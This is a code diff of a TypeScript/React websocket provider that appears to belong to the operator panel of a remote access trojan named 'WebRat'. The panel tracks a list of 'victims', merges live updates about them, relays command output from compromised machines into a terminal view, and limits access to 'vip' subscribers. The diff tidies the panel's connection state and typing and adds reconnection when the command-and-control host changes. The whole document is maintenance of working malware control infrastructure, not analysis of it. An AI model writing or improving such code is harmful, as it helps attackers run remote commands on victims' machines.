@@ -31,7 +31,7 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
   const qc = useQueryClient();
   const subQ = useSubscriptionQuery();
 
-  const [state, setState] = useState<WsConnState>("idle");
+  const [wsState, setWsState] = useState<WsConnState>("idle");
 
   const wsRef = useRef<WebSocket | null>(null);
   const reconnectTimer = useRef<number | null>(null);
@@ -41,6 +41,10 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
 
   const isVip = String(subQ.data?.status || "").toLowerCase() === "vip";
 
+  const state: WsConnState = useMemo(() => {
+    return isVip ? wsState : "closed";
+  }, [isVip, wsState]);
+
   const clearReconnect = useCallback(() => {
     if (reconnectTimer.current != null) {
       window.clearTimeout(reconnectTimer.current);
@@ -48,7 +52,7 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
     }
   }, []);
 
-  const closeWs = useCallback(() => {
+  const closeWsRaw = useCallback(() => {
     clearReconnect();
     const ws = wsRef.current;
     wsRef.current = null;
@@ -62,7 +66,6 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
       } catch {
       }
     }
-    setState("closed");
   }, [clearReconnect]);
 
   const scheduleReconnect = useCallback(() => {
@@ -102,10 +105,10 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
     }
 
     wsRef.current = ws;
-    setState("connecting");
+    setWsState("connecting");
 
     ws.onopen = () => {
-      setState("open");
+      setWsState("open");
       try {
         qc.invalidateQueries({ queryKey: ["victims"] });
       } catch {
@@ -122,26 +125,32 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
 
       const t = String(msg.type || "");
 
-      if (t === "victims" && Array.isArray((msg as any).victims)) {
-        const list = ((msg as any).victims as unknown[]).filter(Boolean) as Victim[];
-        qc.setQueryData(["victims"], list);
+      const obj = msg as Record<string, unknown>;
+
+      if (t === "victims") {
+        const victimsVal = obj.victims;
+        if (Array.isArray(victimsVal)) {
+          const list = (victimsVal.filter(Boolean) as unknown[]).filter((x) => typeof x === "object" && x != null) as Victim[];
+          qc.setQueryData(["victims"], list);
+        }
       } else if (t === "update") {
-        const id = String((msg as any).id || "").trim();
+        const id = typeof obj.id === "string" || typeof obj.id === "number" ? String(obj.id).trim() : "";
         if (!id) return;
         qc.setQueryData(["victims"], (prev: unknown) => {
           const arr = Array.isArray(prev) ? (prev as Victim[]) : [];
-          const idx = arr.findIndex((v) => String((v as any).id ?? "") === id);
+          const idx = arr.findIndex((v) => String((v as { id?: unknown }).id ?? "") === id);
           if (idx === -1) return arr;
           const next = [...arr];
-          next[idx] = { ...next[idx], ...(msg as any) } as Victim;
+
+          const patch = msg as unknown as Partial<Victim>;
+          next[idx] = { ...next[idx], ...patch } as Victim;
           return next;
         });
       } else if (t === "cmd_output") {
         try {
-          const out = (msg as any).output;
-          if (typeof (window as any).WebRatAppendTerminalOutput === "function") {
-            (window as any).WebRatAppendTerminalOutput(out != null ? String(out) : "");
-          }
+          const out = obj.output;
+          const fn = (window as unknown as { WebRatAppendTerminalOutput?: unknown }).WebRatAppendTerminalOutput;
+          if (typeof fn === "function") fn(out != null ? String(out) : "");
         } catch {
         }
       }
@@ -151,7 +160,7 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
 
     ws.onclose = () => {
       wsRef.current = null;
-      setState("closed");
+      setWsState("closed");
 
       scheduleReconnect();
     };
@@ -163,15 +172,49 @@ export function PanelWsProvider(props: { children: React.ReactNode }) {
 
   useEffect(() => {
     if (!isVip) {
-      closeWs();
+      closeWsRaw();
       return;
     }
 
-    connect();
+    const t = window.setTimeout(() => {
+      try {
+        connectRef.current();
+      } catch {
+      }
+    }, 0);
     return () => {
-      closeWs();
+      window.clearTimeout(t);
+      closeWsRaw();
     };
-  }, [closeWs, connect, isVip]);
+  }, [closeWsRaw, connect, isVip]);
+
+  useEffect(() => {
+    const onHost = () => {
+      if (!isVip) return;
+      try {
+        closeWsRaw();
+        setWsState("closed");
+      } catch {
+      }
+      try {
+        connectRef.current();
+      } catch {
+      }
+    };
+
+    try {
+      window.addEventListener("webrat_ws_host_changed", onHost as EventListener);
+    } catch {
+      return;
+    }
+
+    return () => {
+      try {
+        window.removeEventListener("webrat_ws_host_changed", onHost as EventListener);
+      } catch {
+      }
+    };
+  }, [closeWsRaw, isVip]);
 
   const sendJson = useCallback((payload: Record<string, unknown>): boolean => {
     const ws = wsRef.current;
